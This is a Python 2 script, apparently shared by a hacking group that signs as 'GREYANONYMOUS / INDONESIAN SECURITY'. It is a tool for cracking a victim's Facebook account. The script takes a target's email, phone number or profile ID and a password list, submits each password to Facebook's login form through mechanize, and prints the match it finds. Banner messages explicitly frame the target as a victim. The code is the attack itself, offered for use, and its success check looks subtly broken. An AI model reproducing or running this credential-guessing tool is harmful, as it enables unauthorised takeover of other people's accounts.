#change the code won't make you a coder'
#respect me ,
#welcome to my family

import sys
import random
import mechanize
import cookielib


GHT = '''
                                                                coddddoc
   cdO00kc                                  coo               d0NWMMMMWXOl       loo
  cOWMWMXl                                 dXWNo            cOWWMMMMMMMMMNk      kNWKl
  dNMMWNKl                                 kWMNo           c0WMMMMMMMMMMMMW0c    0MMKl
  kWMWklc                                  kWMNo          lKWMMMMMMMMMMMMMMW0c   0MMKl
  kWMXo                                    kWMNo         c0MMMMMMMMMMMMMMMMMWk   0MMKl
 o0WMNkll coooolc       loddoc    loddo    kWMNxodddoc   xWMMMMMMMMMMMMMMMMMMXo  0WMKl  coolco
xNWMMMWWKokWWWWNXOc   dKNWWWWKl lONWWWWKx  kWMWWWWWMWXx  OWMMMMMMMMMMMMMMMMMMWO  0MMKl c0WWKo
xWMMMMMM0oOMMMWWWWO  xNMMWWMMXlcKWWWWWWMNx kWMMMMWMMWMNoc0MMMMMMMMMMMMMMMMMMMM0  0MMKc kWWNx
oOXWMWKOdcdOOOKNWMXlcKWWNOkkOklxWMW0dxXMM0cxWMWXOkOXWMWxc0NNWMMMMMMMMMMMMMMWNW0  0WMKloNWW0
  kWMNo        OWMNddNMWk      kWMXo  OMMKlxWMNd   dNMWxc0OoxXWMMMMMMMMMMWKxlO0  0WMKx0WWX
  kWMNo    lllo0WMNddWMWx      OMMWX0KNWMXokWMNo   oXMWkcOOk  xXMMMMMMMMNx   kk  0MMNXWWNx
  kWMNo  l0NNWWWMMNddWMWx      OMMMWWMMMMXokWMNo   oNMWk k0c   lONWMMWN0l    Ox  0MMWWWMXl
  kWMNo cKWWWWNWWMNddWMWx      OMMNOxkkkkdckWMNo   oNMWk dXx     lkNNOl     dKo  0MMXKNMWk
  kWMNo oXMW0  OWMNddNMWk      kWMNo       kWMNo   xNMWk  0N0xolclx0KkoccoxONKc  0MMKd0WWXm
  kWMNo lXMW0oo0WMNdlKMMNOkkOOldNMWXkkkkOx xWMW0xO0XMMNd  oXMWWNNWXdoKWNNWWWWO   0MMKloXWW0c
  kWMXo  0MMWWWWMMNd xNMMMMMMXl OWMWWMMMM0cxWMMMMMMWMW0c  xNMWWWWWkloxNWWWWWMO   0MMKc kWMWk
  kWWXo  lKWWWXKNWNd  dKWWMWWKl ckXWMMWWWk dNWWMMWWWNOc   OMMN0kXWOOOkNMXkkXW0c  OWWKl c0WWKl
  cool     odoc loo     odddoc    codddol   cldddddoc     kNNk  0WNWWNMMk  OXo   cool;   cool
                                                           ooc c0WWWWXXWk  lc
                                Code by GREYANONYMOUS          oOKKXKO0Xo
                                                                xKKXK0K0
                                 INDONESIAN SECURITY            xKKXK0K0
                                                                xKKXKKX0
                            IG @indonesian_security_id          x00KKKXO
                            git @indonesiansecurity             d00KKKXk
                            Facebook @mentor_cyber              d0000KXk
                                                                



'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"


email = str(raw_input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(raw_input("Enter the name of the password list file : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
         
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log == login:
        print "\n\n\n [*] Password found .. !!"
        print "\n [*] Password : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()